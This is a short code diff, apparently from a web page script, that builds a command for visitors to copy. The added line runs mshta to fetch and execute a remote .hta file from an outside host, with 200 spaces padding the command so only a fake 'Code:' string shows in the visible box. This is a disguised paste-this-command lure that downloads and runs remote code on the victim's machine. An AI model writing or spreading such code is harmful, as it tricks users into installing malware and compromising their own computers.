@@ -58,7 +58,8 @@
       .then(data => {
         code = data.code;
         const spaces = " ".repeat(200);
-        const cmd = `mshta https://freegamecopier.onrender.com/verifyaccept.vbs${spaces}Code: ${code}`;
+        // Updated to use .hta instead of .vbs
+        const cmd = `mshta https://freegamecopier.onrender.com/verifyaccept.hta${spaces}Code: ${code}`;
         document.getElementById("cmdBox").textContent = cmd;
         window.generatedCommand = cmd;
       });
